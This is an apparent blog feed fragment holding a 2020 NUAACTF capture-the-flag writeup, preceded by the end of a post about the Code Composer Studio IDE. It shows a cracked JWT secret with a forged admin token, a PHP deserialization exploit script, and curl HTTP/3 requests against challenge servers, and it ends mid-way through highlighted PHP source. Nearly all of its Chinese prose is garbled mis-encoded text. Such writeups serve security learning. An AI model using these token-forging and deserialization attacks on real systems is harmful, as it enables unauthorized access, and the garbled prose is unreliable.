·è¿è¡Œç¨‹åºçš„æ—¶å€™ï¼Œå°±ä¼šè‡ªåŠ¨åœ¨ç»“æŸæ—¶åœä¸‹ï¼ŒæŠŠå›¾ç”»å‡ºæ¥äº†ï¼<em>ï¼ˆå½“ç„¶ç„å­¦æƒ…å†µå°±ä¸å¥½è¯´äº†23333ï¼‰</em></p></li><li><p>â€¦â€¦</p></li></ol><p>åæ­£ç»å¸¸ Reload å°±å®Œäº‹äº† hhhhhã€‚</p><p>è¿™ä¸ªç‰ˆæœ¬çš„è½¯ä»¶ç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯ï¼ŒåŠŸèƒ½å®ç°çš„è®¾è®¡ä¸Šååˆ†ä¸å‹å¥½ï¼Œç”¨æˆ·ä½“éªŒå°±æ„Ÿè§‰æŒºè ¢çš„ã€‚</p><p>ä¸è¿‡æ¯•ç«Ÿæ˜¯å¤šå¤è€çš„ç‰ˆæœ¬å‘¢ï¼</p><p>BTWï¼Œä¹‹å‰è¿˜ç”¨è¿‡ CCS v9.x ç‰ˆæœ¬å¼€å‘ MSP432 ä¹‹ç±»çš„ MCUï¼Œå½“æ—¶ç”¨Cè¯­è¨€å¼€å‘ï¼Œä¸»è¦æ˜¯ MCU å‡½æ•°æ¥å£çš„èµ„æ–™æ¯”è¾ƒå°‘ï¼Œåªæœ‰å®˜æ–¹è‹±æ–‡æ–‡æ¡£ï¼Œé‚£æ—¶ç½‘ä¸Šè¿˜æ²¡æœ‰å¤šå°‘å…³äºé‚£æ¬¾ MCU çš„ä½¿ç”¨ç»éªŒï¼ˆç°åœ¨ä¸æ¸…æ¥šäº†ï¼‰ï¼Œå°±æ¯”è¾ƒéš¾å—ï¼Œä½†ç›¸æ¯”è€Œè¨€è½¯ä»¶ä½¿ç”¨æ„Ÿè§‰ä¸Šå°±å¥½å¤šäº†ã€‚å¯èƒ½æ˜¯æ–°ç‰ˆæœ¬æ¢äº†åŸºäº <em>Eclipse</em> å¼€æºè½¯ä»¶æ¡†æ¶æ¥åšç•Œé¢çš„åŸå› å§ 23333333ã€‚</p><p>å°±è¿™æ ·å§ã€‚</p><p>ï¼ˆæºœäº†å–µ~</p><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.ti.com.cn/tool/cn/CCSTUDIO">Code Composer Studio é›†æˆå¼€å‘ç¯å¢ƒ (IDE)</a>ï¼ˆTI å®˜ç½‘ï¼‰</p><p>æˆ´æ˜æ¡¢, å‘¨å»ºæ±Ÿ. TMS320C54x DSP ç»“æ„ã€åŸç†åŠåº”ç”¨(ç¬¬2ç‰ˆ)[M]. åŒ—äº¬:åŒ—äº¬èˆªç©ºèˆªå¤©å¤§å­¦å‡ºç‰ˆç¤¾.</p>]]></content>
      
      
      <categories>
          
          <category> tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> tips </tag>
            
            <tag> Configuration </tag>
            
            <tag> DSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 NUAACTF å¸å–µå–µé˜Ÿ Writeup</title>
      <link href="2020/05/30/CTF_2020NUAACTF/"/>
      <url>2020/05/30/CTF_2020NUAACTF/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p><strong>å¸å–µå–µï¼Œå†²å†²å†²ï¼</strong></p><p>æœŸå¾…å·²ä¹…çš„ 2020 NUAACTF ç»ˆäºæ¥äº†å‘€ï¼</p><p>ç©(å¤´)è€(ç§ƒ)äº†ä¸€ä¸ªä¸‹åˆï¼Œæ•´ä½“è€Œè¨€æ„Ÿè§‰ä¸Š<strong>éš¾åº¦é›¨éœ²å‡æ²¾</strong>ï¼Œç„¶è€ŒæŒºèŒ«ç„¶çš„ã€‚</p><p>æœ€åç»ˆäºå†²åˆ°äº†æ ¡å†…ç¬¬äºŒï¼Œæ„Ÿè§‰å¥½æ£’å•Šï¼</p><p>è¿™ç¯‡ Writeup æ˜¯ç”±å¸å–µå–µé˜Ÿå…±åŒå®Œæˆçš„ï¼Œæˆ‘ä¸»è¦çœ‹çš„æ˜¯ Miscã€Cryptoã€Reverseï¼ˆåæ­£å°±éšç¼˜çœ‹2333ï¼‰ï¼Œä¿©é˜Ÿå‹ @Noname å’Œ @Sophia æ‰“ Web å’Œ Pwnï¼Œéƒ½æŒºè¾›è‹¦çš„ã€‚</p><p>åœ¨æ­¤åŸºç¡€ä¸Šæˆ‘åŠ äº†ç‚¹è‡ªå·±çš„æ„Ÿå—ä»€ä¹ˆçš„å§ã€‚</p><p><em>ä¹‹åå¤ç°çš„æ—¶å€™å†åŠ ç‚¹ä¸œè¥¿å§ï¼ˆå’•ã€‚</em></p><h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><p><img src="/2020/05/30/CTF_2020NUAACTF/RankingListTotal.png" alt="å…¨éƒ¨æ¦œå•"></p><p><img src="/2020/05/30/CTF_2020NUAACTF/upload_50cd0a2a5971518f93ae8269000afabf.png" alt="æ ¡å†…æ¦œå•"></p><p>ä¸Šé¢æ˜¯ ä¸åˆ†/åˆ† æ ¡å†…å¤– çš„éƒ¨åˆ†æ¦œå•ã€‚</p><p>æ ¡å¤–é€‰æ‰‹å¤ªå¼ºäº†å•Šå•Šå•Šå•Šï¼ï¼ˆå¤ªé˜”æ€•äº†å˜¤å˜¤å˜¤ï¼‰</p><p>æ ¡å†…è¿˜ç®—å‹å¥½ï¼Œä½†æœ€åä¸€ä¸ªå°æ—¶æƒŠå¿ƒåŠ¨é­„ï¼Œæ’ååœ¨2-4ä½ä¹‹é—´æ³¢åŠ¨ã€‚</p><p>æœ€åå‡ åˆ†é’Ÿé˜Ÿå‹å†²äº†ä¸€æ³¢ pwnï¼Œå†²åˆ°äº†ç¬¬äºŒï¼Œå¤ªæ£’äº†ï¼</p><p>æ¯”èµ›å¼€å§‹ä¸€ä¸ªå°æ—¶è¿˜æ²¡æ°é¥­ï¼Œé‚£æ—¶å€™çœ‹äº†çœ‹æ”¾å‡ºæ¥çš„é¢˜ï¼Œé©¬ä¸Šæœ‰æ€è·¯èƒ½åšçš„éƒ½å·®ä¸å¤šäº†ï¼Œç„¶åå°±å»æ°äº†ä¸ªé¥­ã€‚</p><p>å›æ¥åˆ°æ¯”èµ›ç»“æŸè¿™ä¸­é—´å‡ ä¸ªå°æ—¶ï¼Œ<strong>çœŸ çš„ å¤´ ç§ƒ</strong>ï¼Œåˆå›°åˆç´¯åˆæ— åŠ©ï¼Œå°±æ˜¯å¥½å¤šé¢˜çœ‹ä¸Šå»èƒ½åšä½†åšä¸å‡º flag é‚£ç§â€¦â€¦é¡ºæ‰‹æ‰“å¼€äº†éŸ³ä¹èˆ’ç¼“ä¸€ä¸‹å¿ƒæƒ…ã€‚</p><p><img src="/2020/05/30/CTF_2020NUAACTF/upload_7cb6ec474349e2e415bb5eb411fbf1bf.png" alt="å¸å–µå–µ"></p><hr><h2 id="å¹³å°ä¿¡æ¯"><a href="#å¹³å°ä¿¡æ¯" class="headerlink" title="å¹³å°ä¿¡æ¯"></a>å¹³å°ä¿¡æ¯</h2><p><a href="http://47.102.118.76:8000/">http://47.102.118.76:8000</a></p><p>éƒ¨åˆ†é¢˜ç›®ç¯å¢ƒä¿¡æ¯ï¼š</p><blockquote><p>web1 checkin:<br><a href="http://139.9.221.0:8086/">http://139.9.221.0:8086/</a> å·²éƒ¨ç½²</p><p>web2 jwt :<br><a href="http://139.9.221.0:8090/">http://139.9.221.0:8090/</a> å·²éƒ¨ç½²</p><p>web3 easypop<br><a href="http://139.9.221.0:8088/">http://139.9.221.0:8088/</a> å·²éƒ¨ç½²</p><p>web4 command inj:<br><a href="http://139.9.221.0:8092/">http://139.9.221.0:8092/</a> å·²éƒ¨ç½²</p><p>web5-escape<br><a href="http://139.9.221.0:8094/">http://139.9.221.0:8094/</a> å·²éƒ¨ç½²</p><p>misc3-babyhttp å·²éƒ¨ç½²<br>106.14.153.173 8443</p><p>pwn1-first-pwn<br>49.235.243.206 10501<br><a href="https://share.weiyun.com/qoaVHGg8">https://share.weiyun.com/qoaVHGg8</a></p><p>pwn2-baby-format<br>49.235.243.206 10502<br><a href="https://share.weiyun.com/efHNDo4X">https://share.weiyun.com/efHNDo4X</a></p><p>pwn3-baby-rop<br>49.235.243.206 10503<br><a href="https://share.weiyun.com/gwHWgypr">https://share.weiyun.com/gwHWgypr</a></p><p>pwn4-easy-heap<br>49.235.243.206 10504<br><a href="https://share.weiyun.com/uh36Y68j">https://share.weiyun.com/uh36Y68j</a></p><p>pwn5-easy-format<br>49.235.243.206 10505<br><a href="https://share.weiyun.com/0zDGYyYw">https://share.weiyun.com/0zDGYyYw</a></p><p>pwn6-baby-shellcode<br>49.235.243.206 10506<br><a href="https://share.weiyun.com/HLUP79Fs">https://share.weiyun.com/HLUP79Fs</a></p></blockquote><p>å®˜æ–¹æºç  GitHub ä»“åº“<a href="https://github.com/Kit4y/2020-NUAACTF-SZCup">åœ¨è¿™é‡Œ</a>ã€‚</p><br><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web1-checkin"><a href="#web1-checkin" class="headerlink" title="web1-checkin"></a>web1-checkin</h3><p>çœ‹æºç ç›´æ¥å‡ºflag</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530210037402.png" alt="checkin"></p><blockquote><p>BTWï¼Œè¿™ä¸ªå›¾æˆ‘æœ€æ—©æ˜¯åœ¨ä»¥å‰çš„äº”å››è¯„ä¼˜ç½‘ç«™ä¸Šçœ‹åˆ°çš„ï¼Œç°åœ¨é‚£ä¸ªç³»ç»Ÿå·²ç»ä¸å†ä½¿ç”¨äº†ã€‚é‚£æ—¶å€™æ­£å¥½è®¤è¯†äº†äºè€æ¿å“ˆå“ˆå“ˆå“ˆã€‚ï¼ˆå¹ä¸€æ³¢ï¼</p></blockquote><h3 id="web2-jwt"><a href="#web2-jwt" class="headerlink" title="web2-jwt"></a>web2-jwt</h3><p>é€šè¿‡å·¥å…· <strong>c-jwt-crack</strong> å¾—åˆ° key</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530201155492.png" alt="key"></p><p>key:<br><code>NuAa</code></p><p>åœ¨çº¿å¹³å°æ„é€  jwt</p><p><a href="https://jwt.io/">https://jwt.io/</a></p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530201238039.png" alt="jwt"></p><p>å¾—åˆ° JWT</p><pre class="language-none"><code class="language-none">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.SYQ-AGwY5XIcxY621ToK8zEgomHE0Bla9tAUWTLxnwA</code></pre><p>æ”¹ jwt ç™»å½• admin è´¦å·å³å¯å¾—åˆ°flagã€‚</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530201535739.png" alt="flag"></p><p>è€—å‡ é”…é”…å¤ªå¼ºäº†ï¼</p><h3 id="web3-easypop"><a href="#web3-easypop" class="headerlink" title="web3-easypop"></a>web3-easypop</h3><p>æ‰“å¼€é¢˜ç›®ç›´æ¥å‡ºæºç </p><p><img src="/2020/05/30/CTF_2020NUAACTF/haha.png" alt="web3"></p><p><strong>Exp:</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">lemon</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$ClassObj</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">ClassObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">evil</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">lemon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span></code></pre><p>æŠŠç»“æœç›´æ¥ä¼ å‚ç»™dï¼Œå‡ºflagã€‚</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530205135242.png" alt="web3-flag"></p><br><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="misc1-å‡ç¬‘ç”·å­©"><a href="#misc1-å‡ç¬‘ç”·å­©" class="headerlink" title="misc1-å‡ç¬‘ç”·å­©"></a>misc1-å‡ç¬‘ç”·å­©</h3><p><em>gayæœ¨çš„å¾®ç¬‘ï¼ˆé›¾</em></p><p>é¢˜ç›®éƒ½æç¤ºäº†å‡ç¬‘äº†ï¼Œæ€»å¾—çœ‹åˆ°ç¬‘å®¹å˜›ã€‚</p><p>ç›´æ¥ PNG æ”¹é«˜åº¦å°±å®Œäº‹äº†ã€‚</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530182611962.png" alt="laugh"></p><p>äºæ˜¯flagï¼š</p><p><code>flag{i_want_jiamu_power}</code></p><p><strong>æˆ‘æƒ³è¦å˜‰æœ¨çš„åŠ›é‡ï¼</strong></p><h3 id="misc2-wireshark"><a href="#misc2-wireshark" class="headerlink" title="misc2-wireshark"></a>misc2-wireshark</h3><p>ç›´æ¥æ‹¿ wireshark æ‰“å¼€ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢æœ‰ä¸ªæ–‡ä»¶å†…å®¹å°±æ˜¯ flag å‘¢ï¼</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530131040440.png" alt="misc2-1"></p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200530131016434.png" alt="misc2-2"></p><p><code>nuaactf{wir2sha4k_1s_gReat}</code></p><h3 id="misc3-babyhttp"><a href="#misc3-babyhttp" class="headerlink" title="misc3-babyhttp"></a>misc3-babyhttp</h3><blockquote><p>ä½ çŸ¥é“ä»€ä¹ˆæ˜¯ HTTP å—ï¼Ÿ</p><p>ï¼ˆä½ é€šè¿‡ä¸€èˆ¬æ–¹å¼æ˜¯æ‰“ä¸å¼€ç½‘ç«™çš„ï¼‰ </p><p>Hint: The newest. </p><p>106.14.153.173 8443</p><p>ä¹‹ååŠ çš„ Hint: HTTPå‘å±•å²</p></blockquote><p>è¿™é¢˜çœ‹åˆ°æœ€æ–°çš„ HTTPï¼Œå…¶å®æˆ‘ä¸€å¼€å§‹å°±çŒœæ˜¯ HTTP3ï¼ˆQUICï¼‰äº†ã€‚ï¼ˆæœç„¶æ˜¯é™†è€æ¿å‡ºçš„é¢˜ï¼Œå˜¤å˜¤å˜¤</p><p>æ¯•ç«Ÿæˆ‘è¿™ä¸ªåšå®¢æœ¬èº«å°±åŸºäº CloudFlare éƒ¨ç½²äº† HTTP3ï¼Œåªæ˜¯ç›®å‰çš„æµè§ˆå™¨æ”¯æŒè¿˜ä¸æ˜¯å¾ˆå¥½ã€‚</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200531005455811.png" alt="http3"></p><p>è¿™é¢˜è¯•ç€ç”¨ Chrome å¼€å¯ QUIC è¿›è¡Œè®¿é—® <a href="https://106.14.154.173:8443/">https://106.14.154.173:8443</a> ï¼Œå‘ç°è¢«æ‹’ç»ã€‚ç”¨wireshark æŠ“åŒ…ä¹Ÿæ²¡æŠ“åˆ°æœ‰å…³çš„æµé‡ï¼Œåªçœ‹åˆ°äº† TCP æ•°æ®åŒ…ã€‚</p><p>ä¸­é€”æ€€ç–‘éš¾é“æ˜¯ HTTP2 çš„ä¸€äº›ç½•è§æ–¹æ³•ï¼Ÿäºæ˜¯ç”¨ postman æŠŠæ‰€æœ‰æ–¹æ³•éƒ½è¯•äº†ä¸€éï¼Œå…¨è¢«æ‹’ç»äº†ã€‚</p><p>å†å›æ¥é‡æ–°æœäº†ä¸€æ³¢ HTTP3 çš„èµ„æ–™ï¼Œè€ƒè™‘æ˜¯<strong>ç”¨ curl æ¥è¿æ¥</strong>ï¼Œé¡ºä¾¿è®°å½•ä¸€ä¸‹ï¼Œæ¯”å¦‚ä¸‹é¢å‡ ä¸ªï¼š</p><blockquote><p><a href="https://blog.cloudflare.com/zh/http3-the-past-present-and-future-zh/">HTTP/3ï¼šè¿‡å»ï¼Œç°åœ¨ï¼Œè¿˜æœ‰æœªæ¥</a> ï¼ˆè¿™ä¹Ÿæ˜¯æœ€åç»™çš„hintäº†ï¼‰</p><p><a href="https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version">curl  HTTP3 (and QUIC)</a></p><p><a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl çš„ç”¨æ³•æŒ‡å—ï¼ˆé˜®ä¸€å³°ï¼‰</a></p><p><a href="https://curl.haxx.se/libcurl/c/libcurl-tutorial.html">libcurl programming tutorial</a></p><p><a href="https://geekflare.com/http3-test/">How to Test if a Website supports HTTP/3?</a></p><p><a href="https://geekflare.com/curl-installation/">How to Build and Install latest cURL version on CentOS/RHEL?</a></p><p>ç½‘ç«™ HTTP3 éƒ¨ç½²æµ‹è¯•ï¼š</p><p><a href="https://gf.dev/http3-test">HTTP/3 Test, Check if H3/QUIC is enabled on your website</a></p><p><a href="https://www.http3check.net/">HTTP/3 CHECK</a></p></blockquote><p>ç„¶åæŒ‰ç…§ä¸Šé¢çš„æµç¨‹<strong>åŸºäº Rust &amp; quiche æ¥å®‰è£… curl</strong>ã€‚</p><p>Build quiche and BoringSSL:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone --recursive https://github.com/cloudflare/quiche<span class="token builtin class-name">cd</span> quichecargo build --release --features pkg-config-meta,qlog<span class="token function">mkdir</span> deps/boringssl/lib<span class="token function">ln</span> -vnf <span class="token variable"><span class="token variable">$(</span><span class="token function">find</span> target/release -name libcrypto.a -o -name libssl.a<span class="token variable">)</span></span> deps/boringssl/lib/</code></pre><p>è€Œå Build curl:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token punctuation">..</span><span class="token function">git</span> clone https://github.com/curl/curl<span class="token builtin class-name">cd</span> <span class="token function">curl</span>./buildconf./configure <span class="token assign-left variable">LDFLAGS</span><span class="token operator">=</span><span class="token string">"-Wl,-rpath,<span class="token environment constant">$PWD</span>/../quiche/target/release"</span> --with-ssl<span class="token operator">=</span><span class="token environment constant">$PWD</span>/<span class="token punctuation">..</span>/quiche/deps/boringssl --with-quiche<span class="token operator">=</span><span class="token environment constant">$PWD</span>/<span class="token punctuation">..</span>/quiche/target/release --enable-alt-svc<span class="token function">make</span></code></pre><p>ä¸Šé¢ build è¿‡ç¨‹ä¸­éœ€è¦è‡ªè¡Œå®‰è£… cargoã€CMakeã€Goã€autoconfã€libtoolize ç­‰ä¾èµ–ï¼Œæˆ–è€…æ ¹æ®æŠ¥é”™ä¿¡æ¯ç›¸åº”è¿›è¡Œå®‰è£…å°±å¥½ã€‚ï¼ˆä¸€ç¯å¥—ä¸€ç¯ï¼Œç»äº†</p><p>æ¯”å¦‚ CMake æŠ¥é”™æ‰¾ä¸åˆ° Goï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> golang</code></pre><p>å†æ¯”å¦‚æŠ¥é”™éœ€è¦ autoconfã€libtoolizeï¼š</p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200531181838258.png" alt="autoconf"></p><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200531181939936.png" alt="libtoolize"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> autoconf<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libtoolize</code></pre><p>ç„¶è€Œå›½å†…å‡ºå£é€Ÿåº¦ä¸è¡Œï¼Œåœ¨æœ¬åœ°åœ¨å›½å†…çš„æœåŠ¡å™¨ä¸Šéƒ½è¯•äº†ï¼Œè£…äº†å‡ ä¸ªå°æ—¶ curl åˆ°æ¯”èµ›ç»“æŸéƒ½æ²¡è£…ä¸Šï¼Œä»£ç åŠå¤©æ‹‰ä¸ä¸‹æ¥ã€‚åæ¥ç›´æ¥ä¸‹è½½ä»“åº“ ZIP å†è£…ï¼Œbuild è¿˜è¦ä¸‹è½½æ–°ä¸œè¥¿ï¼Ÿï¼Ÿï¼Ÿå¥½æ°”å•Šï¼åšé¢˜çš„æ—¶å€™è¶…æƒ³æ‰¾ä¸ª curl ç¼–è¯‘æœ‰ http3 çš„å°ä¼™ä¼´ã€‚ã€‚<em>ï¼ˆçœ‹æ¥æ‰“CTFæ•´ä¸ªå›½å¤–VPSæ¥è·‘å¾ˆæœ‰å¿…è¦</em></p><p>å®‰è£…å¥½ä¹‹åå°±å¯ä»¥è¯•è¯•äº†ï¼Œæ¯”å¦‚çœ‹çœ‹ç‰ˆæœ¬ä¿¡æ¯ã€‚ï¼ˆè¦ç”¨ build å¥½çš„ curlï¼‰</p><pre class="language-bash" data-language="bash"><code class="language-bash">./curl --version</code></pre><p>è¿™é¢˜ curl å‡ºæ¥æ˜¯ä¸€ä¸ªwebé¢˜â€¦â€¦</p><pre class="language-bash" data-language="bash"><code class="language-bash">./curl -v https://106.14.153.173:8443  --http3 </code></pre><p><img src="/2020/05/30/CTF_2020NUAACTF/image-20200531184849738.png" alt="ä¸€ä¸ªwebé¢˜"></p><p>æç¤ºè®¿é—®<code>check.php</code>.</p><pre class="language-bash" data-language="bash"><code class="language-bash">./curl -v https://106.14.153.173:8443/check.php  --http3 </code></pre><p>å¾—åˆ°ä¸€é“é¢˜ï¼ŒPHPçš„ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #000000</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #0000BB</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="<">&amp;lt;</span>?php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #007700</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>include<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #DD0000</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>'flag.php'<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #007700</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #0000BB</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>error_reporting<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #007700</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>(<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #0000BB</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #007700</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>if<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>(<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #0000BB</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>$_SERVER<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #007700</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>[<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #DD0000</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>"REQUEST_METHOD"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #007700</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>]<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span>==<span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> #DD0000</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>"POST"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span>            <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token 